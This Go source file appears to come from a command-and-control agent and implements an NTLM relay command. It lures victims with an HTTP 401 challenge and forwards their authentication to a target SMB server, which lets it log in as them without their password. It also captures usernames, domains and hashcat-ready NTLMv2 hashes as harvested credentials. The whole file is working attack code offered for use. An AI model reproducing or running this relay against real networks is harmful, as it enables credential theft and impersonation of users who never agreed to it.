package commands

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// NTLM relay: intercepts NTLM authentication from victims (via HTTP 401
// challenge) and relays it to a target SMB server, authenticating as the
// victim without knowing their password. Combined with LLMNR/NBT-NS
// poisoning, this enables credential relay attacks (T1557.001).

const (
	relayMaxDuration = 600 // max 10 minutes
	relayDefaultPort = 445
	relayHTTPPort    = 80
	relaySMBTimeout  = 30 * time.Second
)

// relayResult is the JSON output for a relay session.
type relayResult struct {
	Duration  string          `json:"duration"`
	ListenPort int            `json:"listen_port"`
	Target     string         `json:"target"`
	TargetPort int            `json:"target_port"`
	Relays     []*relayEntry  `json:"relays"`
	Errors     []string       `json:"errors,omitempty"`
}

// relayEntry represents a single relay attempt.
type relayEntry struct {
	Timestamp  int64  `json:"timestamp"`
	VictimIP   string `json:"victim_ip"`
	Username   string `json:"username"`
	Domain     string `json:"domain"`
	Target     string `json:"target"`
	Success    bool   `json:"success"`
	Hashcat    string `json:"hashcat,omitempty"`
	Status     string `json:"status"` // "authenticated", "logon_failure", "error"
	Detail     string `json:"detail,omitempty"`
}

// executeRelayCore runs the NTLM relay server. Cross-platform core logic.
func executeRelayCore(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	// Parse relay-specific params from the generic fields
	target := params.ResponseIP // reuse response_ip field for relay target
	if target == "" {
		return errorf("relay target required: set response_ip to the target host")
	}

	targetPort := relayDefaultPort
	listenPort := relayHTTPPort

	// Parse ports field: "listen:445" or just use defaults
	if params.Ports != "" {
		parts := strings.SplitN(params.Ports, ":", 2)
		if len(parts) == 2 {
			if _, err := fmt.Sscanf(parts[0], "%d", &listenPort); err != nil {
				listenPort = relayHTTPPort
			}
			if _, err := fmt.Sscanf(parts[1], "%d", &targetPort); err != nil {
				targetPort = relayDefaultPort
			}
		} else {
			if _, err := fmt.Sscanf(parts[0], "%d", &targetPort); err != nil {
				targetPort = relayDefaultPort
			}
		}
	}

	duration := params.Duration
	if duration <= 0 {
		duration = 120
	}
	if duration > relayMaxDuration {
		duration = relayMaxDuration
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	result := &relayResult{
		ListenPort: listenPort,
		Target:     target,
		TargetPort: targetPort,
	}
	var mu sync.Mutex

	start := time.Now()

	// Start HTTP listener for victim connections
	listenAddr := fmt.Sprintf(":%d", listenPort)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return errorf("bind HTTP %s: %v", listenAddr, err)
	}
	defer listener.Close()

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	// Accept connections until context expires
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return
				default:
					continue
				}
			}
			go handleRelayConn(ctx, conn, target, targetPort, &mu, result)
		}
	}()

	// Wait for context to expire
	<-ctx.Done()

	result.Duration = fmt.Sprintf("%.1fs", time.Since(start).Seconds())

	// Build credential entries for ProcessResponse
	var credentials []*sniffCredential
	for _, r := range result.Relays {
		cred := &sniffCredential{
			Protocol:  "ntlmv2-relay",
			SrcIP:     r.VictimIP,
			DstIP:     target,
			DstPort:   uint16(targetPort),
			Username:  r.Username,
			Timestamp: r.Timestamp,
			Detail: fmt.Sprintf("NTLM relay %s | target=%s:%d | status=%s",
				r.Status, target, targetPort, r.Status),
		}
		if r.Hashcat != "" {
			cred.Password = r.Hashcat
		}
		if r.Domain != "" {
			cred.Username = r.Domain + "\\" + r.Username
		}
		credentials = append(credentials, cred)
	}

	// Build combined output
	output := struct {
		*relayResult
		Credentials []*sniffCredential `json:"credentials"`
	}{
		relayResult: result,
		Credentials: credentials,
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("marshal result: %v", err)
	}

	return structs.CommandResult{
		Completed: true,
		Output:    string(jsonBytes),
	}
}

// handleRelayConn handles a single victim HTTP connection, performing the
// full NTLM relay: HTTP→victim, victim→SMB target, SMB target→victim.
func handleRelayConn(ctx context.Context, conn net.Conn, target string, targetPort int, mu *sync.Mutex, result *relayResult) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(60 * time.Second))

	victimAddr := conn.RemoteAddr().(*net.TCPAddr)
	buf := make([]byte, 16384)

	entry := &relayEntry{
		Timestamp: time.Now().Unix(),
		VictimIP:  victimAddr.IP.String(),
		Target:    target,
		Status:    "error",
	}
	defer func() {
		mu.Lock()
		result.Relays = append(result.Relays, entry)
		mu.Unlock()
	}()

	// Round 1: Read initial HTTP request, send 401 to trigger NTLM
	n, err := conn.Read(buf)
	if err != nil {
		entry.Detail = fmt.Sprintf("read initial request: %v", err)
		return
	}

	// Check if this request already has NTLM auth
	ntlmData := extractHTTPNTLMAuth(string(buf[:n]))
	if ntlmData == nil {
		// No auth yet — send 401 to trigger NTLM negotiation
		sendHTTP401NTLM(conn, "")

		// Read the Type 1 response
		n, err = conn.Read(buf)
		if err != nil {
			entry.Detail = fmt.Sprintf("read Type 1 request: %v", err)
			return
		}
		ntlmData = extractHTTPNTLMAuth(string(buf[:n]))
	}

	if ntlmData == nil {
		entry.Detail = "no NTLM data in request"
		return
	}

	// Validate this is a Type 1 (Negotiate)
	if err := relayNTLMValidate(ntlmData, ntlmTypeNegotiate); err != nil {
		entry.Detail = fmt.Sprintf("invalid Type 1: %v", err)
		return
	}

	// Step 2: Relay Type 1 to target SMB server, get Type 2 back
	select {
	case <-ctx.Done():
		entry.Detail = "context cancelled before relay"
		return
	default:
	}

	rc, type2, err := relayNTLMToSMB(target, targetPort, relaySMBTimeout, ntlmData)
	if err != nil {
		entry.Detail = fmt.Sprintf("relay Type 1 to target: %v", err)
		return
	}
	defer rc.close()

	// Step 3: Forward Type 2 challenge to victim via HTTP 401
	type2B64 := base64.StdEncoding.EncodeToString(type2)
	sendHTTP401NTLM(conn, type2B64)

	// Step 4: Read victim's Type 3 response
	n, err = conn.Read(buf)
	if err != nil {
		entry.Detail = fmt.Sprintf("read Type 3 request: %v", err)
		return
	}

	type3Data := extractHTTPNTLMAuth(string(buf[:n]))
	if type3Data == nil {
		entry.Detail = "no NTLM Type 3 in final request"
		return
	}

	if err := relayNTLMValidate(type3Data, ntlmTypeAuthenticate); err != nil {
		entry.Detail = fmt.Sprintf("invalid Type 3: %v", err)
		return
	}

	// Extract user info and hashcat format
	user, domain := relayExtractType3Info(type3Data)
	entry.Username = user
	entry.Domain = domain

	// Build hashcat hash from the relayed Type 2 challenge + Type 3
	serverChallenge := relayExtractType2Challenge(type2)
	if serverChallenge != nil {
		entry.Hashcat = relayBuildNTLMv2Hashcat(type3Data, serverChallenge)
	}

	// Step 5: Forward Type 3 to target to complete authentication
	success, status, err := relayCompleteAuth(rc, type3Data)
	if err != nil {
		entry.Detail = fmt.Sprintf("relay Type 3 to target: %v", err)
		return
	}

	if success {
		entry.Success = true
		entry.Status = "authenticated"
		entry.Detail = fmt.Sprintf("Successfully relayed %s\\%s to %s:%d",
			domain, user, target, targetPort)
	} else {
		switch status {
		case smb2StatusLogonFailure:
			entry.Status = "logon_failure"
			entry.Detail = "NTLM relay logon failure (SMB signing required or account restricted)"
		case smb2StatusAccountRestrict:
			entry.Status = "account_restricted"
			entry.Detail = "Account restricted (may require workstation trust or MFA)"
		default:
			entry.Status = "failed"
			entry.Detail = fmt.Sprintf("SESSION_SETUP failed: status 0x%08X", status)
		}
	}

	// Send 200 to close HTTP cleanly
	_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
}
